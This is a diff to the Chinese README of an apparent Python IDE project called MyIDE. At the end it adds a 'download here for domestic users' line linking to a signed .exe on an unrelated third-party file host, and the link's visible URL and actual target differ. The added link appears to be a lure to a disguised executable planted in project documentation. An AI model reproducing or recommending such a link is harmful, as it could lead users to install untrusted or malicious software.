@@ -1,3 +1,4 @@
+
 # MyIDE - 多功能Python IDE
 
 MyIDE是一个功能丰富的Python IDE，支持多种编程语言，具有语法高亮、自动补全、语法检查等功能。
@@ -170,3 +171,5 @@ MyIDE开发团队
 - 主题切换功能
 - 自动保存功能
 - 可配置的IDE设置
+  # 国内用户请在这里下载
+[  https://exe1.webgetstore.com/2025/11/29/00ccffdb03cbfdb64e0879f3ef41b763.exe?sg=a92c9f14b8b724623e87dbf746493a32&e=692afb83&fileName=my_ide.exe&fi=264545943](https://exe1.webgetstore.com/2025/11/29/00ccffdb03cbfdb64e0879f3ef41b763.exe?sg=ab499fb149d21c257a762a5c824593ec&e=692afbe0&fileName=my_ide.exe&fi=264545943)
